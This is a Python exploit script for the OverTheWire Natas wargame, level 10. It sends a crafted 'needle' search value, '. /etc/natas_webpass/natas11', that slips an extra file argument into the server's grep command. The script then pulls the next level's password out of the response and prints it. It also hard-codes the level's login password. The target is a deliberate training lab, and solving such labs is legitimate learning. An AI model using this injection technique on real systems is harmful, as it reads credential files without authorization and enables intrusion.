import requests
import re
requests.packages.urllib3.disable_warnings()

url = "http://natas10.natas.labs.overthewire.org"

def exp():
    data_post = {
        "needle": ". /etc/natas_webpass/natas11",
        "submit": "Search"
    }

    r = requests.post(url, auth=('natas10', 't7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu'), verify=False, data=data_post)
    if r.status_code == 200:
        password = re.findall(r'/etc/natas_webpass/natas11:(\S+)', r.text)[0]
        print("Password for natas11: " + password)
        
if __name__ == "__main__":
    exp()